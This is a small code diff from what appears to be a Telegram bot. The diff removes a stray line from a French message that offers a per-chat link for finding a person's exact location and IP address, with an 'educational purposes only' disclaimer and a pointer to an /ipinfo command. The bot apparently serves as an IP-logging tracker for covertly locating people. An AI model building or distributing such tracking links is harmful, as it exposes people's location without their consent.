@@ -10,7 +10,6 @@ Pour connaître son emplacement, sa localisation exacte 📡
 et même voir son adresse IP 🔍  
 👇  
 ⚠️ Utilisation à vos risques et périls. Pour but éducatif uniquement. :\n${baseUrl}/${chatId}\n\n` +
-      `.\n\n` +
       `Pour obtenir des informations détaillées une fois l'adresse IP reçue, utilisez la commande /ipinfo.`;
 
     await bot.sendMessage(chatId, message);
